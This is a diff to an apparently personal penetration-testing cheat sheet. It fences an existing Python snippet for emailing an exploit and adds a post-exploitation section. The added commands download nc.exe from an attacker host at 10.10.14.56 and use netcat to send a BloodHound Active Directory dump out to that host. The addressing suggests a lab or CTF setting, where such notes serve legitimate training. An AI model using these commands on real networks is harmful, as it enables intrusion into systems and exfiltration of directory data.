@@ -476,6 +476,7 @@ Enumeration commands for Remote Desktop service;
 
 ## Sending email with python exploit in it
             
+```bash
         from email.mime.multipart import MIMEMultipart
         from email.mime.text import MIMEText
         import smtplib
@@ -516,3 +517,23 @@ Enumeration commands for Remote Desktop service;
         server.quit()
 
         print("[***]successfully sent email to %s:" % (msg['To']))  
+```
+
+
+
+`######## POST EXPLOITATION  ########`
+
+# File transer
+
+> Window to linux
+```bash
+# upload nc.exe in window
+Invoke-WebRequest -Uri "10.10.14.56:8000/nc.exe" -OutFile ".\nc.exe"
+
+# In windows run
+ cmd.exe /c 'nc.exe 10.10.14.56 4445 < 20250326082030_BloodHound.zip'
+
+# In linux
+nc -lnvp 4445 > 20250326082030_BloodHound.zip
+```
+
